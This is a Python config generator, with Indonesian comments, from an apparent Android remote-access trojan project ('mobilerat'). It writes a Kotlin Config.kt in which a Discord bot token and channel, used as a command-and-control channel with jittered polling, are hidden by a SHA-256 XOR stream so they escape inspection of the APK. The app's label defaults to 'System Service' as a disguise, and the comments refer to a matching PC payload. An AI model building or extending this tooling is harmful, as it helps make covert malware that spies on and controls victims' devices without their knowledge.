"""tools/genconfig.py — tulis Config.kt berisi konfigurasi terenkripsi.

Algoritmanya sama persis dengan core/_crypt.py di payload PC (SHA-256 counter
stream + XOR + base64), dan dibaca di sisi Android oleh Vault.kt.

Pakai:
    python tools\\genconfig.py --token "<token>" --channel 123
    python tools\\genconfig.py --uuid 7b05519d-... --poll 4
"""

import argparse
import base64
import hashlib
import os
import secrets
import sys

SEP = "\x1f"

TEMPLATE = '''package com.kai.mobilerat

/**
 * Dihasilkan oleh tools/genconfig.py — jangan diedit tangan.
 * Token dan channel tidak pernah muncul sebagai string utuh di dalam APK.
 */
object Config {

    private const val KEY = "%(key)s"
    private const val BLOB = "%(blob)s"

    private val fields: List<String> by lazy { Vault.open(BLOB, KEY) }

    val token: String get() = fields.getOrElse(0) { "" }
    val channel: String get() = fields.getOrElse(1) { "" }
    val uuid: String get() = fields.getOrElse(2) { "dev" }
    val alias: String get() = fields.getOrElse(3) { "" }
    val api: String get() = fields.getOrElse(4) { "https://discord.com/api/v10" }
    val label: String get() = fields.getOrElse(5) { "System Service" }

    /** Jeda polling dasar. Jitter ditambahkan di service. */
    const val POLL_MS: Long = %(poll)d
}
'''


def stream(key: bytes, n: int) -> bytes:
    seed = hashlib.sha256(key).digest()
    out = bytearray()
    counter = 0
    while len(out) < n:
        out += hashlib.sha256(seed + counter.to_bytes(4, "big")).digest()
        counter += 1
    return bytes(out[:n])


def encode(fields, key: bytes) -> str:
    plain = SEP.join(fields).encode("utf-8")
    ks = stream(key, len(plain))
    raw = bytes(a ^ b for a, b in zip(plain, ks))
    return base64.b64encode(raw).decode("ascii")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--token", default="")
    ap.add_argument("--channel", default="")
    ap.add_argument("--uuid", default="")
    ap.add_argument("--alias", default="",
                    help="nama pendek perangkat. kosong = otomatis dari "
                         "codename (Build.DEVICE), mis. ginkgo -> gink")
    ap.add_argument("--api", default="https://discord.com/api/v10")
    ap.add_argument("--label", default="System Service")
    ap.add_argument("--poll", type=int, default=4000)
    ap.add_argument("--out", default="")
    args = ap.parse_args()

    if not args.token or not args.channel:
        print("[!] --token dan --channel wajib")
        return 2

    uuid = args.uuid or "%s-%s-%s-%s-%s" % (
        secrets.token_hex(4),
        secrets.token_hex(2),
        secrets.token_hex(2),
        secrets.token_hex(2),
        secrets.token_hex(6),
    )

    key = secrets.token_bytes(16)
    blob = encode(
        [args.token, str(args.channel), uuid, args.alias, args.api, args.label],
        key,
    )

    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    out = args.out or os.path.join(
        root, "app", "src", "main", "java", "com", "kai", "mobilerat", "Config.kt"
    )
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(TEMPLATE % {
            "key": base64.b64encode(key).decode("ascii"),
            "blob": blob,
            "poll": args.poll,
        })

    print("[*] out   : %s" % out)
    print("[*] uuid  : %s" % uuid)
    print("[*] alias : %s" % args.alias)
    print("[*] blob  : %d char" % len(blob))

    # Bukti bahwa blob benar-benar bisa dibuka dengan kunci yang sama.
    if encode([args.token, str(args.channel), uuid, args.alias, args.api, args.label], key) != blob:
        print("[!] verifikasi blob gagal")
        return 1
    if args.token in open(out, encoding="utf-8").read():
        print("[!] token bocor plaintext di Config.kt")
        return 1
    print("[*] cek   : token tidak muncul plaintext")
    return 0


if __name__ == "__main__":
    sys.exit(main())
